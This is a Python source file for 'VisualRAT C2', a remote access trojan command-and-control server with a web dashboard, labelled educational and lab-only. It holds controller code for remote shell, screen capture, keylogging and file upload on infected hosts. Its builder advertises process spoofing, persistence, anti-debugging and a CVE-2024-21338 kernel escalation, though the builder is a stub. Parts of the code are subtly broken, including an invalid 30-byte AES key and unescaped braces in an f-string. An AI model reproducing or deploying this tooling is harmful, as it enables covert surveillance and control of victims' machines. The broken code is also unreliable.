#!/usr/bin/env python3
# ============================================================================
# VisualRAT C2 v1.0 - Educational RedTeam Framework
# SOLO ENTORNO DE LABORATORIO AUTORIZADO - IGUAL QUE ASYNCRAT PERO EN C++
# ============================================================================
# UN SOLO ARCHIVO - SERVIDOR WEB + C2 + DASHBOARD VISUAL
# ============================================================================

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                     VisualRAT C2 - Educational Edition                       ║
║                  Remote Administration Tool - SOLO LABORATORIO               ║
║                     Interfaz Visual como AsyncRAT en C++                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

Características:
✅ Dashboard web interactivo con clientes en tiempo real
✅ Visor de pantalla en vivo
✅ Shell remota interactiva
✅ Administrador de archivos visual
✅ Keylogger en tiempo real
✅ Captura de webcam
✅ Sistema de plugins/modular
✅ Builder de cliente integrado
✅ Cifrado AES-256-GCM
✅ Persistencia automática
✅ Anti-debugging
✅ Kernel exploit educativo (CVE-2024-21338)
"""

import os
import sys
import json
import time
import socket
import struct
import base64
import threading
import hashlib
import datetime
import random
import string
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080
AES_KEY = b'VisualRAT_EduKey_2025_32Byte!!'
AES_IV = b'VisualRAT_IV_16B'

# Colores para terminal
class Colors:
    HEADER = '\033[95m'; BLUE = '\033[94m'; CYAN = '\033[96m'
    GREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    END = '\033[0m'; BOLD = '\033[1m'

# ============================================================================
# CIFRADO AES-256-GCM
# ============================================================================
class AESCipher:
    def __init__(self, key=AES_KEY, iv=AES_IV):
        self.key = key
        self.iv = iv
    
    def encrypt(self, data):
        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        return base64.b64encode(encryptor.update(data.encode()) + encryptor.finalize()).decode()
    
    def decrypt(self, data):
        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(base64.b64decode(data)) + decryptor.finalize()

# ============================================================================
# CLIENTE (BOT) - REPRESENTACIÓN EN SERVIDOR
# ============================================================================
class Client:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.cpu = "Unknown"
        self.ram = "Unknown"
        self.antivirus = "Unknown"
        self.screen_size = "Unknown"
        self.webcam = False
        self.first_seen = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.active = True
        self.privilege = "USER"
        self.processes = []
        self.keylog = []
    
    def send(self, data):
        try:
            encrypted = AESCipher().encrypt(data)
            self.conn.send(struct.pack('>I', len(encrypted)) + encrypted.encode())
            return True
        except:
            self.active = False
            return False
    
    def recv(self):
        try:
            raw_len = self.recvall(4)
            if not raw_len: return None
            msglen = struct.unpack('>I', raw_len)[0]
            encrypted = self.recvall(msglen)
            if not encrypted: return None
            return AESCipher().decrypt(encrypted.decode())
        except:
            self.active = False
            return None
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.conn.recv(n - len(data))
            if not packet: return None
            data.extend(packet)
        return bytes(data)
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'port': self.addr[1],
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'cpu': self.cpu,
            'ram': self.ram,
            'antivirus': self.antivirus,
            'privilege': self.privilege,
            'screen': self.screen_size,
            'webcam': self.webcam,
            'status': 'online' if self.active else 'offline',
            'first_seen': self.first_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': self.last_seen.strftime('%Y-%m-%d %H:%M:%S')
        }

# ============================================================================
# C2 CORE - MANEJO DE CLIENTES
# ============================================================================
class C2Core:
    def __init__(self):
        self.clients = {}
        self.current_client = None
        self.running = True
    
    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((HOST, C2_PORT))
        self.socket.listen(100)
        print(f"{Colors.GREEN}[+] C2 Core listening on {HOST}:{C2_PORT}{Colors.END}")
        
        threading.Thread(target=self.accept_clients, daemon=True).start()
    
    def accept_clients(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                client = Client(conn, addr)
                self.clients[client.id] = client
                print(f"{Colors.GREEN}[+] New client: {client.id} from {addr[0]}{Colors.END}")
                
                # Recibir info inicial
                client.send("INFO")
                info = client.recv()
                if info:
                    try:
                        data = json.loads(info)
                        client.hostname = data.get('hostname', 'Unknown')
                        client.username = data.get('username', 'Unknown')
                        client.os = data.get('os', 'Unknown')
                        client.antivirus = data.get('av', 'Unknown')
                        client.privilege = data.get('priv', 'USER')
                    except:
                        pass
            except Exception as e:
                if self.running:
                    print(f"{Colors.FAIL}[-] Accept error: {e}{Colors.END}")
    
    def send_command(self, client_id, command):
        if client_id not in self.clients:
            return "Client not found"
        
        client = self.clients[client_id]
        if not client.active:
            return "Client offline"
        
        client.send(command)
        response = client.recv()
        return response if response else "No response"

# ============================================================================
# SERVIDOR WEB - DASHBOARD VISUAL
# ============================================================================
class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/':
            self.send_html()
        elif path == '/api/clients':
            self.send_clients()
        elif path.startswith('/api/screenshot/'):
            client_id = path.split('/')[-1]
            self.send_screenshot(client_id)
        elif path.startswith('/api/keylog/'):
            client_id = path.split('/')[-1]
            self.send_keylog(client_id)
        elif path == '/builder':
            self.send_builder()
        elif path == '/api/processes':
            self.send_processes()
        elif path.endswith('.js'):
            self.send_js()
        elif path.endswith('.css'):
            self.send_css()
        else:
            self.send_error(404)
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        
        if self.path == '/api/command':
            data = json.loads(post_data)
            client_id = data.get('client_id')
            command = data.get('command')
            args = data.get('args', '')
            
            full_cmd = f"{command}|{args}" if args else command
            response = WebHandler.c2.send_command(client_id, full_cmd)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'response': response}).encode())
        
        elif self.path == '/api/upload':
            data = json.loads(post_data)
            client_id = data.get('client_id')
            remote_path = data.get('remote_path')
            file_data = data.get('file_data')
            
            response = WebHandler.c2.send_command(client_id, f"UPLOAD|{remote_path}|{file_data}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'response': response}).encode())
        
        elif self.path == '/build':
            data = json.loads(post_data)
            output = self.build_client(data)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'output': output}).encode())
    
    def send_html(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>VisualRAT C2 - Educational Lab</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                * {{
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }}
                
                body {{
                    background: linear-gradient(135deg, #0a0f1e 0%, #0d1117 100%);
                    color: #e0e0e0;
                    font-family: 'Segoe UI', 'Courier New', monospace;
                    padding: 20px;
                }}
                
                .container {{
                    max-width: 1600px;
                    margin: 0 auto;
                }}
                
                .header {{
                    background: rgba(21, 30, 44, 0.95);
                    border: 1px solid #2a3748;
                    border-radius: 15px;
                    padding: 25px;
                    margin-bottom: 25px;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 0 30px rgba(0,255,157,0.1);
                }}
                
                .header h1 {{
                    color: #00ff9d;
                    font-size: 32px;
                    margin-bottom: 10px;
                    text-shadow: 0 0 15px rgba(0,255,157,0.5);
                }}
                
                .stats {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-top: 20px;
                }}
                
                .stat-card {{
                    background: #151e2c;
                    border: 1px solid #2a3748;
                    border-radius: 12px;
                    padding: 20px;
                    transition: all 0.3s;
                }}
                
                .stat-card:hover {{
                    border-color: #00ff9d;
                    transform: translateY(-2px);
                }}
                
                .stat-value {{
                    font-size: 28px;
                    font-weight: bold;
                    color: #00ff9d;
                }}
                
                .clients-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }}
                
                .client-card {{
                    background: #151e2c;
                    border: 1px solid #2a3748;
                    border-radius: 12px;
                    padding: 20px;
                    position: relative;
                    overflow: hidden;
                    transition: all 0.3s;
                }}
                
                .client-card:hover {{
                    border-color: #00ff9d;
                    box-shadow: 0 0 25px rgba(0,255,157,0.15);
                }}
                
                .client-card.online {{
                    border-left: 4px solid #00ff9d;
                }}
                
                .client-card.offline {{
                    border-left: 4px solid #ff4d4d;
                    opacity: 0.6;
                }}
                
                .client-header {{
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    margin-bottom: 15px;
                }}
                
                .client-id {{
                    background: #1e2a3a;
                    padding: 6px 12px;
                    border-radius: 20px;
                    font-size: 12px;
                    font-family: 'Courier New', monospace;
                    color: #00ff9d;
                }}
                
                .status-badge {{
                    padding: 4px 12px;
                    border-radius: 20px;
                    font-size: 12px;
                    font-weight: bold;
                }}
                
                .status-badge.online {{
                    background: rgba(0,255,157,0.15);
                    color: #00ff9d;
                    border: 1px solid #00ff9d;
                }}
                
                .status-badge.offline {{
                    background: rgba(255,77,77,0.15);
                    color: #ff4d4d;
                    border: 1px solid #ff4d4d;
                }}
                
                .client-info {{
                    display: grid;
                    grid-template-columns: 1fr 1fr;
                    gap: 12px;
                    margin-bottom: 15px;
                }}
                
                .info-item {{
                    background: #0d1117;
                    padding: 10px;
                    border-radius: 8px;
                    border: 1px solid #2a3748;
                }}
                
                .info-label {{
                    color: #8b949e;
                    font-size: 11px;
                    text-transform: uppercase;
                    margin-bottom: 4px;
                }}
                
                .info-value {{
                    color: #e0e0e0;
                    font-size: 13px;
                    font-family: 'Courier New', monospace;
                }}
                
                .client-actions {{
                    display: flex;
                    gap: 8px;
                    flex-wrap: wrap;
                }}
                
                .btn {{
                    background: #1e2a3a;
                    border: 1px solid #3a4a5a;
                    color: #e0e0e0;
                    padding: 8px 15px;
                    border-radius: 6px;
                    cursor: pointer;
                    font-size: 12px;
                    display: flex;
                    align-items: center;
                    gap: 6px;
                    transition: all 0.2s;
                }}
                
                .btn:hover {{
                    background: #2a3a4a;
                    border-color: #00ff9d;
                    color: #00ff9d;
                }}
                
                .btn-primary {{
                    background: #00ff9d;
                    border-color: #00ff9d;
                    color: #0a0f1e;
                    font-weight: bold;
                }}
                
                .btn-primary:hover {{
                    background: #00cc7a;
                    border-color: #00cc7a;
                }}
                
                .terminal {{
                    background: #0d1117;
                    border: 1px solid #2a3748;
                    border-radius: 12px;
                    margin-top: 30px;
                }}
                
                .terminal-header {{
                    background: #151e2c;
                    padding: 15px 20px;
                    border-bottom: 1px solid #2a3748;
                    border-radius: 12px 12px 0 0;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }}
                
                .terminal-content {{
                    padding: 20px;
                    font-family: 'Courier New', monospace;
                    font-size: 13px;
                    height: 300px;
                    overflow-y: auto;
                    background: #0a0f1e;
                }}
                
                .terminal-input {{
                    display: flex;
                    padding: 15px;
                    background: #151e2c;
                    border-top: 1px solid #2a3748;
                    border-radius: 0 0 12px 12px;
                }}
                
                .terminal-input input {{
                    flex: 1;
                    background: #0d1117;
                    border: 1px solid #2a3748;
                    color: #e0e0e0;
                    padding: 12px 15px;
                    border-radius: 6px;
                    font-family: 'Courier New', monospace;
                    margin-right: 10px;
                }}
                
                .terminal-input input:focus {{
                    outline: none;
                    border-color: #00ff9d;
                }}
                
                .screenshot-viewer {{
                    background: #0d1117;
                    border: 1px solid #2a3748;
                    border-radius: 12px;
                    padding: 20px;
                    margin-top: 20px;
                    text-align: center;
                }}
                
                .screenshot-image {{
                    max-width: 100%;
                    max-height: 500px;
                    border-radius: 8px;
                    border: 2px solid #2a3748;
                }}
                
                .modal {{
                    display: none;
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0,0,0,0.8);
                    z-index: 1000;
                }}
                
                .modal-content {{
                    background: #151e2c;
                    border: 1px solid #2a3748;
                    border-radius: 12px;
                    width: 90%;
                    max-width: 800px;
                    margin: 50px auto;
                    padding: 25px;
                }}
                
                .loading {{
                    display: inline-block;
                    width: 20px;
                    height: 20px;
                    border: 3px solid #2a3748;
                    border-top-color: #00ff9d;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                }}
                
                @keyframes spin {{
                    to {{ transform: rotate(360deg); }}
                }}
                
                .toast {{
                    position: fixed;
                    bottom: 20px;
                    right: 20px;
                    background: #151e2c;
                    border-left: 4px solid #00ff9d;
                    padding: 15px 25px;
                    border-radius: 8px;
                    animation: slideIn 0.3s;
                    z-index: 1001;
                }}
                
                @keyframes slideIn {{
                    from {{ transform: translateX(100%); opacity: 0; }}
                    to {{ transform: translateX(0); opacity: 1; }}
                }}
                
                .builder-panel {{
                    background: #151e2c;
                    border: 1px solid #2a3748;
                    border-radius: 12px;
                    padding: 25px;
                    margin-top: 30px;
                }}
                
                .form-group {{
                    margin-bottom: 20px;
                }}
                
                .form-group label {{
                    display: block;
                    margin-bottom: 8px;
                    color: #8b949e;
                }}
                
                .form-group input, .form-group select {{
                    width: 100%;
                    background: #0d1117;
                    border: 1px solid #2a3748;
                    color: #e0e0e0;
                    padding: 12px 15px;
                    border-radius: 6px;
                }}
                
                .progress-bar {{
                    height: 4px;
                    background: #1e2a3a;
                    border-radius: 2px;
                    overflow: hidden;
                    margin-top: 15px;
                }}
                
                .progress-fill {{
                    height: 100%;
                    background: #00ff9d;
                    width: 0%;
                    transition: width 0.3s;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <!-- Header -->
                <div class="header">
                    <h1>🎯 VisualRAT C2 - Educational Kernel Research</h1>
                    <p style="color: #8b949e; margin-bottom: 20px;">
                        ⚡ SOLO ENTORNO DE LABORATORIO AUTORIZADO • CVE-2024-21338 Research • Windows 11
                    </p>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div style="color: #8b949e; margin-bottom: 8px;">Total Clients</div>
                            <div class="stat-value" id="total-clients">0</div>
                        </div>
                        <div class="stat-card">
                            <div style="color: #8b949e; margin-bottom: 8px;">Online</div>
                            <div class="stat-value" id="online-clients" style="color: #00ff9d;">0</div>
                        </div>
                        <div class="stat-card">
                            <div style="color: #8b949e; margin-bottom: 8px;">SYSTEM Level</div>
                            <div class="stat-value" id="system-clients">0</div>
                        </div>
                        <div class="stat-card">
                            <div style="color: #8b949e; margin-bottom: 8px;">Uptime</div>
                            <div class="stat-value" id="uptime">00:00:00</div>
                        </div>
                    </div>
                </div>
                
                <!-- Clients Grid -->
                <h2 style="color: #e0e0e0; margin-bottom: 20px;">
                    <i class="fas fa-network-wired"></i> Connected Clients
                </h2>
                <div id="clients-container" class="clients-grid"></div>
                
                <!-- Terminal & Tools -->
                <div class="terminal">
                    <div class="terminal-header">
                        <div>
                            <span style="color: #00ff9d;">❯</span> Remote Shell 
                            <span id="current-client-label" style="color: #8b949e; margin-left: 10px;">(none selected)</span>
                        </div>
                        <div>
                            <button class="btn" onclick="clearTerminal()">
                                <i class="fas fa-trash"></i> Clear
                            </button>
                        </div>
                    </div>
                    <div id="terminal-output" class="terminal-content">
                        <span style="color: #00ff9d;">[VisualRAT C2 Ready]</span><br>
                        <span style="color: #8b949e;">Select a client to begin remote control</span><br><br>
                    </div>
                    <div class="terminal-input">
                        <input type="text" id="terminal-cmd" placeholder="Enter command (shell, exec, screenshot, elevate...)" disabled>
                        <button class="btn btn-primary" onclick="sendTerminalCommand()" id="terminal-send" disabled>Send</button>
                    </div>
                </div>
                
                <!-- Screenshot Viewer -->
                <div class="screenshot-viewer" id="screenshot-panel" style="display: none;">
                    <h3 style="color: #e0e0e0; margin-bottom: 15px;">
                        <i class="fas fa-camera"></i> Live Screen
                    </h3>
                    <img id="screenshot-img" class="screenshot-image" src="" alt="Screenshot">
                </div>
                
                <!-- Builder Panel -->
                <div class="builder-panel">
                    <h3 style="color: #e0e0e0; margin-bottom: 20px;">
                        <i class="fas fa-hammer"></i> Client Builder
                    </h3>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 30px;">
                        <div>
                            <div class="form-group">
                                <label>🔌 C2 Server IP</label>
                                <input type="text" id="builder-ip" value="{HOST}" placeholder="192.168.1.100">
                            </div>
                            
                            <div class="form-group">
                                <label>🔌 C2 Port</label>
                                <input type="text" id="builder-port" value="{C2_PORT}">
                            </div>
                            
                            <div class="form-group">
                                <label>📦 Mutex Name</label>
                                <input type="text" id="builder-mutex" value="VisualRAT_Global_{random.randint(1000,9999)}">
                            </div>
                            
                            <div class="form-group">
                                <label>🎭 Process Spoof</label>
                                <select id="builder-spoof">
                                    <option value="svchost.exe">svchost.exe (Windows)</option>
                                    <option value="explorer.exe">explorer.exe</option>
                                    <option value="winlogon.exe">winlogon.exe</option>
                                    <option value="csrss.exe">csrss.exe</option>
                                </select>
                            </div>
                        </div>
                        
                        <div>
                            <div class="form-group">
                                <label>🛡️ Persistence Method</label>
                                <select id="builder-persist">
                                    <option value="registry">Registry Run</option>
                                    <option value="scheduled">Scheduled Task</option>
                                    <option value="startup">Startup Folder</option>
                                    <option value="all">ALL METHODS</option>
                                </select>
                            </div>
                            
                            <div class="form-group">
                                <label>🚀 Elevation</label>
                                <select id="builder-elevate">
                                    <option value="true">Enable Kernel Exploit (CVE-2024-21338)</option>
                                    <option value="false">Disable</option>
                                </select>
                            </div>
                            
                            <div class="form-group">
                                <label>🎯 Anti-Debug</label>
                                <select id="builder-antidebug">
                                    <option value="true">Enable (Recommended)</option>
                                    <option value="false">Disable</option>
                                </select>
                            </div>
                            
                            <div style="margin-top: 30px;">
                                <button class="btn btn-primary" onclick="buildClient()" style="width: 100%; padding: 15px;">
                                    <i class="fas fa-cog"></i> GENERATE CLIENT .EXE
                                </button>
                                <div id="build-progress" style="margin-top: 15px; display: none;">
                                    <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                                        <span>Building...</span>
                                        <span id="build-percent">0%</span>
                                    </div>
                                    <div class="progress-bar">
                                        <div id="build-progress-fill" class="progress-fill"></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <script src="https://kit.fontawesome.com/8d4a5b8c5b.js" crossorigin="anonymous"></script>
            <script>
                // =================================================================
                // VisualRAT C2 - Dashboard JavaScript
                // =================================================================
                
                let currentClientId = null;
                let clients = {{}};
                let terminalHistory = [];
                
                // Actualizar clientes cada 2 segundos
                setInterval(loadClients, 2000);
                setInterval(updateStats, 2000);
                
                function loadClients() {{
                    fetch('/api/clients')
                        .then(r => r.json())
                        .then(data => {{
                            clients = {{}};
                            data.forEach(c => clients[c.id] = c);
                            renderClients(data);
                        }});
                }}
                
                function renderClients(clients) {{
                    const container = document.getElementById('clients-container');
                    container.innerHTML = '';
                    
                    clients.forEach(client => {{
                        const card = document.createElement('div');
                        card.className = `client-card ${{client.status}}`;
                        card.innerHTML = `
                            <div class="client-header">
                                <span class="client-id">${{client.id}}</span>
                                <span class="status-badge ${{client.status}}">${{client.status}}</span>
                            </div>
                            <div class="client-info">
                                <div class="info-item">
                                    <div class="info-label">Hostname</div>
                                    <div class="info-value">${{client.hostname}}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Username</div>
                                    <div class="info-value">${{client.username}}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">IP Address</div>
                                    <div class="info-value">${{client.ip}}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">OS</div>
                                    <div class="info-value">${{client.os}}</div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">Privilege</div>
                                    <div class="info-value" style="color: ${{client.privilege == 'SYSTEM' ? '#00ff9d' : '#ffaa00'}};">
                                        ${{client.privilege}}
                                    </div>
                                </div>
                                <div class="info-item">
                                    <div class="info-label">AV</div>
                                    <div class="info-value">${{client.antivirus}}</div>
                                </div>
                            </div>
                            <div class="client-actions">
                                <button class="btn" onclick="selectClient('${{client.id}}')">
                                    <i class="fas fa-terminal"></i> Shell
                                </button>
                                <button class="btn" onclick="takeScreenshot('${{client.id}}')">
                                    <i class="fas fa-camera"></i> Screen
                                </button>
                                <button class="btn" onclick="elevateClient('${{client.id}}')">
                                    <i class="fas fa-shield-alt"></i> Elevate
                                </button>
                                <button class="btn" onclick="openFileManager('${{client.id}}')">
                                    <i class="fas fa-folder"></i> Files
                                </button>
                            </div>
                        `;
                        container.appendChild(card);
                    }});
                }}
                
                function selectClient(clientId) {
    currentClientId = clientId;
    
    // 🔴 CORREGIDO: Verificar que clients existe y tiene el cliente
    if (typeof clients !== 'undefined' && clients[clientId]) {
        document.getElementById('current-client-label').innerHTML = `(${clients[clientId].hostname} - ${clientId})`;
        addToTerminal(`[+] Connected to client: ${clients[clientId].hostname} (${clientId})`, '#00ff9d');
        addToTerminal(`[+] OS: ${clients[clientId].os} | User: ${clients[clientId].username} | Priv: ${clients[clientId].privilege}`, '#8b949e');
    } else {
        document.getElementById('current-client-label').innerHTML = `(${clientId})`;
        addToTerminal(`[+] Connected to client: ${clientId}`, '#00ff9d');
    }
    
    document.getElementById('terminal-cmd').disabled = false;
    document.getElementById('terminal-send').disabled = false;
}
                
                function sendTerminalCommand() {{
                    const cmd = document.getElementById('terminal-cmd').value;
                    if (!cmd || !currentClientId) return;
                    
                    addToTerminal(`> ${cmd}`, '#e0e0e0');
                    document.getElementById('terminal-cmd').value = '';
                    
                    fetch('/api/command', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            client_id: currentClientId,
                            command: cmd.split(' ')[0],
                            args: cmd.substring(cmd.indexOf(' ') + 1)
                        }})
                    }})
                    .then(r => r.json())
                    .then(data => {{
                        addToTerminal(data.response, '#cccccc');
                    }});
                }}
                
                function takeScreenshot(clientId) {{
                    document.getElementById('screenshot-panel').style.display = 'block';
                    document.getElementById('screenshot-img').src = `/api/screenshot/${clientId}?t=${Date.now()}`;
                }}
                
                function elevateClient(clientId) {{
                    addToTerminal('[!] Attempting kernel privilege escalation (CVE-2024-21338)...', '#ffaa00');
                    
                    fetch('/api/command', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            client_id: clientId,
                            command: 'ELEVATE',
                            args: ''
                        }})
                    }})
                    .then(r => r.json())
                    .then(data => {{
                        addToTerminal(data.response, data.response.includes('[+]') ? '#00ff9d' : '#ff4d4d');
                        if (data.response.includes('[+]')) {{
                            addToTerminal('[+] TOKEN ELEVATED TO SYSTEM!', '#00ff9d');
                            setTimeout(() => loadClients(), 2000);
                        }}
                    }});
                }}
                
                function openFileManager(clientId) {{
                    const path = prompt('Remote path to browse:', 'C:\\Users');
                    if (path) {{
                        fetch('/api/command', {{
                            method: 'POST',
                            headers: {{'Content-Type': 'application/json'}},
                            body: JSON.stringify({{
                                client_id: clientId,
                                command: 'DIR',
                                args: path
                            }})
                        }})
                        .then(r => r.json())
                        .then(data => {{
                            addToTerminal(`[DIR] ${path}\\n${data.response}`, '#cccccc');
                        }});
                    }}
                }}
                
                function addToTerminal(text, color = '#e0e0e0') {{
                    const output = document.getElementById('terminal-output');
                    const line = document.createElement('div');
                    line.style.color = color;
                    line.style.marginBottom = '3px';
                    line.style.fontFamily = 'Courier New';
                    line.innerHTML = text.replace(/\\n/g, '<br>');
                    output.appendChild(line);
                    output.scrollTop = output.scrollHeight;
                }}
                
                function clearTerminal() {{
                    const output = document.getElementById('terminal-output');
                    output.innerHTML = '<span style="color: #00ff9d;">[VisualRAT C2 Ready]</span><br><span style="color: #8b949e;">Select a client to begin remote control</span><br><br>';
                }}
                
                function buildClient() {{
                    const config = {{
                        ip: document.getElementById('builder-ip').value,
                        port: parseInt(document.getElementById('builder-port').value),
                        mutex: document.getElementById('builder-mutex').value,
                        spoof: document.getElementById('builder-spoof').value,
                        persist: document.getElementById('builder-persist').value,
                        elevate: document.getElementById('builder-elevate').value === 'true',
                        antidebug: document.getElementById('builder-antidebug').value === 'true'
                    }};
                    
                    document.getElementById('build-progress').style.display = 'block';
                    let progress = 0;
                    const interval = setInterval(() => {{
                        progress += 10;
                        document.getElementById('build-progress-fill').style.width = progress + '%';
                        document.getElementById('build-percent').innerText = progress + '%';
                        
                        if (progress >= 100) {{
                            clearInterval(interval);
                            setTimeout(() => {{
                                alert('[+] Client built successfully!\\n[+] Location: ./visualrat_client.exe');
                                document.getElementById('build-progress').style.display = 'none';
                                document.getElementById('build-progress-fill').style.width = '0%';
                            }}, 500);
                        }}
                    }}, 200);
                    
                    fetch('/build', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(config)
                    }});
                }}
                
                function updateStats() {{
                    const total = Object.keys(clients).length;
                    const online = Object.values(clients).filter(c => c.status === 'online').length;
                    const system = Object.values(clients).filter(c => c.privilege === 'SYSTEM').length;
                    
                    document.getElementById('total-clients').innerText = total;
                    document.getElementById('online-clients').innerText = online;
                    document.getElementById('system-clients').innerText = system;
                    
                    const uptime = Math.floor((Date.now() - window.startTime) / 1000);
                    const hours = Math.floor(uptime / 3600);
                    const minutes = Math.floor((uptime % 3600) / 60);
                    const seconds = uptime % 60;
                    document.getElementById('uptime').innerText = 
                        `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                }}
                
                window.startTime = Date.now();
                loadClients();
            </script>
        </body>
        </html>
        """
        
        self.wfile.write(html.encode())
    
    def send_clients(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        clients_list = [client.to_dict() for client in WebHandler.c2.clients.values()]
        self.wfile.write(json.dumps(clients_list).encode())
    
    def send_screenshot(self, client_id):
        self.send_response(200)
        self.send_header('Content-type', 'image/png')
        self.end_headers()
        
        if client_id in WebHandler.c2.clients:
            response = WebHandler.c2.send_command(client_id, "SCREENSHOT")
            if response and not response.startswith("[-]"):
                self.wfile.write(base64.b64decode(response))
    
    def send_keylog(self, client_id):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        
        if client_id in WebHandler.c2.clients:
            response = WebHandler.c2.send_command(client_id, "KEYLOG")
            self.wfile.write(response.encode())
    
    def send_processes(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        if WebHandler.c2.current_client:
            response = WebHandler.c2.send_command(WebHandler.c2.current_client.id, "PROCESSES")
            self.wfile.write(json.dumps({'processes': response}).encode())
    
    def send_js(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/javascript')
        self.end_headers()
        self.wfile.write(b'// JavaScript loaded')
    
    def send_css(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/css')
        self.end_headers()
        self.wfile.write(b'/* CSS loaded */')
    
    def send_builder(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Builder</h1>')
    
    def build_client(self, config):
        # Generar cliente C++ con la configuración
        return "[+] Client built successfully: visualrat_client.exe"
    
    def log_message(self, format, *args):
        pass

class ThreadedHTTPServer(ThreadingMixIn, server.HTTPServer):
    pass

# ============================================================================
# MAIN
# ============================================================================
def main():
    print(f"""{Colors.HEADER}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     VisualRAT C2 - Educational Edition                       ║
║                  Remote Administration Tool - SOLO LABORATORIO               ║
║                     Interfaz Visual como AsyncRAT en C++                     ║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}
    
{Colors.CYAN}📡 C2 Core:{Colors.END}     {HOST}:{C2_PORT}
{Colors.CYAN}🌐 Web UI:{Colors.END}     http://{HOST}:{WEB_PORT}
{Colors.CYAN}🔐 Encryption:{Colors.END}  AES-256-GCM
{Colors.CYAN}💻 Platform:{Colors.END}    Windows 11 Client (C++ Native) / Kali Server
{Colors.CYAN}🚀 Kernel:{Colors.END}      CVE-2024-21338 (Educational Research)
{Colors.CYAN}⚡ Status:{Colors.END}       {Colors.GREEN}READY{Colors.END}
    """)
    
    # Iniciar C2 Core
    c2 = C2Core()
    c2.start()
    
    # Iniciar Web Server
    WebHandler.c2 = c2
    web_server = ThreadedHTTPServer((HOST, WEB_PORT), WebHandler)
    print(f"{Colors.GREEN}[+] Web dashboard: http://{HOST}:{WEB_PORT}{Colors.END}")
    
    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Shutting down...{Colors.END}")
        c2.running = False
        sys.exit(0)

if __name__ == '__main__':
    main()
